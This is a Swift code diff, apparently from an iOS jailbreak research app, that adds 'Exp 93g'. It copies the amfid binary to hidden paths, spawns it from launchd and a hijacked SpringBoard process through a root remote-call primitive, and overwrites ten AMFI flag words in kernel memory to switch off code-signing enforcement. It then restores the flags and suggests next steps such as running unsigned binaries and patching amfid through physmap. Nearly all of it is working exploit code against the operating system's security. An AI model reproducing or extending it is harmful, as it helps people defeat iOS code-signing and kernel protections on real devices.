@@ -914,6 +914,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③o7 Multi Spawn (Exp 93g)",
+                    icon: "arrow.triangle.2.circlepath",
+                    color: .red,
+                    label: "Multi Spawn",
+                    action: runExp93gMultiSpawn,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -8626,6 +8636,279 @@ struct AMFIExperimentView: View {
         RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
         let st = rc[statusAddr].value32()
         return (Int32(st & 0x7F), Int32(st >> 8))
+    }
+
+    // MARK: - Exp 93g: Multi-Path + SpringBoard Spawn
+
+    /// Exp 93g: posix_spawn fails from /var/tmp via launchd (EPERM).
+    /// Test: 1) different paths, 2) SpringBoard RC, 3) symlink from trusted path
+    private func runExp93gMultiSpawn() {
+        isRunning = true
+        runningLabel = "Multi Spawn"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp93g_multi_spawn") { rc in
+            let result = self.expMultiSpawn(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    private func expMultiSpawn(rc: RemoteCall) -> ExperimentResult {
+        let expName = "Multi Spawn (Exp 93g)"
+        var detail = "Experiment 93g: Multi-Path + SpringBoard Spawn\n"
+        detail += "================================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+        let mem = rc.trojanMem
+
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
+
+        // ============================================================
+        // Step 1: Copy amfid to multiple paths
+        // ============================================================
+        detail += "=== Step 1: Copy binary to various paths ===\n"
+
+        let srcPath = "/usr/libexec/amfid"
+        let testPaths = [
+            "/var/tmp/.exp93g",
+            "/var/root/.exp93g",
+            "/var/mobile/.exp93g",
+            "/var/containers/Bundle/.exp93g",
+            "/private/var/tmp/.exp93g",
+            "/tmp/.exp93g",
+        ]
+
+        let srcAddr = remote_alloc_str(rc, srcPath)
+        let buf = mem + 0x800
+
+        // Read source once into memory
+        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        guard srcFd != UInt64(bitPattern: -1) else {
+            detail += "❌ Cannot open \(srcPath)\n"
+            RootExecutor.rcall(rc, "free", srcAddr)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        let fileSize = RootExecutor.rcall(rc, "lseek", srcFd, 0, 2)
+        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0)
+        detail += "Source: \(srcPath) (\(fileSize) bytes)\n\n"
+
+        var successPaths: [String] = []
+
+        for path in testPaths {
+            let dstAddr = remote_alloc_str(rc, path)
+            RootExecutor.rcall(rc, "unlink", dstAddr)
+
+            let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+            if dstFd == UInt64(bitPattern: -1) {
+                detail += "  \(path): create FAIL ❌\n"
+                RootExecutor.rcall(rc, "free", dstAddr)
+                continue
+            }
+
+            // Copy from source (rewind source each time)
+            RootExecutor.rcall(rc, "lseek", srcFd, 0, 0)
+            var copied: UInt64 = 0
+            for _ in 0..<256 {
+                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+                if n == 0 || n == UInt64(bitPattern: -1) { break }
+                RootExecutor.rcall(rc, "write", dstFd, buf, n)
+                copied += n
+                if n < 4096 { break }
+            }
+            RootExecutor.rcall(rc, "close", dstFd)
+            RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)
+
+            if copied > 0 {
+                detail += "  \(path): copied ✅ (\(copied) bytes)\n"
+                successPaths.append(path)
+            } else {
+                detail += "  \(path): copy failed ❌\n"
+            }
+            RootExecutor.rcall(rc, "free", dstAddr)
+        }
+        RootExecutor.rcall(rc, "close", srcFd)
+        detail += "\n"
+
+        // ============================================================
+        // Step 2: posix_spawn from launchd — test all paths
+        // ============================================================
+        detail += "=== Step 2: posix_spawn from LAUNCHD ===\n\n"
+
+        var launchdResults: [(path: String, ret: Int64, pid: UInt32)] = []
+
+        for path in successPaths {
+            let (ret, pid, err) = doSpawn(rc: rc, path: path, mem: mem)
+            detail += "  \(path):\n    ret=\(ret), pid=\(pid), errno=\(err)"
+            if ret == 0 && pid != 0 {
+                let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
+                detail += ", signal=\(sig), code=\(code)"
+                if sig == 9 { detail += " (SIGKILL)" }
+            }
+            detail += "\n"
+            launchdResults.append((path, ret, pid))
+        }
+
+        // Also test original path
+        let (retOrig, pidOrig, errOrig) = doSpawn(rc: rc, path: srcPath, mem: mem)
+        detail += "  \(srcPath) (original):\n    ret=\(retOrig), pid=\(pidOrig), errno=\(errOrig)"
+        if retOrig == 0 && pidOrig != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pidOrig, mem: mem)
+            detail += ", signal=\(sig), code=\(code)"
+        }
+        detail += "\n\n"
+
+        // ============================================================
+        // Step 3: posix_spawn from SPRINGBOARD
+        // ============================================================
+        detail += "=== Step 3: posix_spawn from SPRINGBOARD ===\n\n"
+
+        var sbResults: [(path: String, ret: Int64, pid: UInt32)] = []
+
+        if let sb = dspmgr.shared.sbProc {
+            let sbMem = sb.trojanMem
+
+            for path in successPaths {
+                let (ret, pid, err) = doSpawn(rc: sb, path: path, mem: sbMem)
+                detail += "  \(path):\n    ret=\(ret), pid=\(pid), errno=\(err)"
+                if ret == 0 && pid != 0 {
+                    let (sig, code) = doWait(rc: sb, pid: pid, mem: sbMem)
+                    detail += ", signal=\(sig), code=\(code)"
+                    if sig == 9 { detail += " (SIGKILL)" }
+                }
+                detail += "\n"
+                sbResults.append((path, ret, pid))
+            }
+
+            // Original path from SB
+            let (retSBOrig, pidSBOrig, errSBOrig) = doSpawn(rc: sb, path: srcPath, mem: sbMem)
+            detail += "  \(srcPath) (original):\n    ret=\(retSBOrig), pid=\(pidSBOrig), errno=\(errSBOrig)"
+            if retSBOrig == 0 && pidSBOrig != 0 {
+                let (sig, code) = doWait(rc: sb, pid: pidSBOrig, mem: sbMem)
+                detail += ", signal=\(sig), code=\(code)"
+            }
+            detail += "\n"
+        } else {
+            detail += "  ❌ No SpringBoard RC available\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 4: Disable AMFI flags + retry best path from SB
+        // ============================================================
+        detail += "=== Step 4: Disable AMFI flags + retry ===\n"
+
+        var originalValues: [(offset: UInt64, value: UInt64)] = []
+        for off in flagOffsets {
+            let addr = amfiDataSlid &+ off
+            let val = ds_kread64_safe(addr)
+            originalValues.append((off, val))
+            ds_kwrite64(addr, 0)
+        }
+        detail += "Flags disabled: 10/10\n\n"
+
+        // Retry from launchd
+        detail += "--- Launchd (flags OFF) ---\n"
+        for path in successPaths.prefix(3) {
+            let (ret, pid, err) = doSpawn(rc: rc, path: path, mem: mem)
+            detail += "  \(path): ret=\(ret), pid=\(pid), errno=\(err)"
+            if ret == 0 && pid != 0 {
+                let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
+                detail += ", sig=\(sig), code=\(code)"
+            }
+            detail += "\n"
+        }
+        detail += "\n"
+
+        // Retry from SpringBoard
+        var sbFlagsOffSuccess = false
+        detail += "--- SpringBoard (flags OFF) ---\n"
+        if let sb = dspmgr.shared.sbProc {
+            let sbMem = sb.trojanMem
+            for path in successPaths.prefix(3) {
+                let (ret, pid, err) = doSpawn(rc: sb, path: path, mem: sbMem)
+                detail += "  \(path): ret=\(ret), pid=\(pid), errno=\(err)"
+                if ret == 0 && pid != 0 {
+                    let (sig, code) = doWait(rc: sb, pid: pid, mem: sbMem)
+                    detail += ", sig=\(sig), code=\(code)"
+                    if sig != 9 { sbFlagsOffSuccess = true }
+                    if sig == 9 { detail += " SIGKILL" }
+                }
+                detail += "\n"
+            }
+
+            // Also try original from SB with flags off
+            let (retF, pidF, errF) = doSpawn(rc: sb, path: srcPath, mem: sbMem)
+            detail += "  \(srcPath): ret=\(retF), pid=\(pidF), errno=\(errF)"
+            if retF == 0 && pidF != 0 {
+                let (sig, code) = doWait(rc: sb, pid: pidF, mem: sbMem)
+                detail += ", sig=\(sig), code=\(code)"
+            }
+            detail += "\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 5: Restore flags + cleanup
+        // ============================================================
+        detail += "=== Step 5: Restore + cleanup ===\n"
+        for (off, origVal) in originalValues {
+            ds_kwrite64(amfiDataSlid &+ off, origVal)
+        }
+        detail += "Flags restored\n"
+
+        // Cleanup files
+        for path in successPaths {
+            let addr = remote_alloc_str(rc, path)
+            RootExecutor.rcall(rc, "unlink", addr)
+            RootExecutor.rcall(rc, "free", addr)
+        }
+        RootExecutor.rcall(rc, "free", srcAddr)
+        detail += "Files cleaned\n\n"
+
+        // ============================================================
+        // VERDICT
+        // ============================================================
+        detail += "=== VERDICT ===\n\n"
+
+        let anyLaunchdWork = launchdResults.contains { $0.ret == 0 }
+        let anySBWork = sbResults.contains { $0.ret == 0 }
+
+        if sbFlagsOffSuccess {
+            detail += "🎉 SpringBoard can spawn with AMFI flags OFF!\n"
+            detail += "This might be the path to jailbreak.\n"
+        } else if anySBWork {
+            detail += "✅ SpringBoard can posix_spawn from some paths!\n"
+            detail += "Next: test with UNSIGNED binary from SB.\n"
+        } else if anyLaunchdWork {
+            detail += "✅ Launchd can spawn from some paths.\n"
+        } else {
+            detail += "❌ posix_spawn fails from all tested paths.\n"
+            detail += "Both launchd and SpringBoard blocked.\n\n"
+            detail += "Remaining options:\n"
+            detail += "  1. Use system() or popen() (resolves /bin/sh)\n"
+            detail += "  2. Use NSTask/NSProcess from SB\n"
+            detail += "  3. dlopen + function call (no new process)\n"
+            detail += "  4. Patch amfid via kernel memory (physmap)\n"
+        }
+
+        return ExperimentResult(name: expName, success: anySBWork || sbFlagsOffSuccess, detail: detail, timestamp: Date())
     }
 
     // MARK: - Exp 93c Helpers
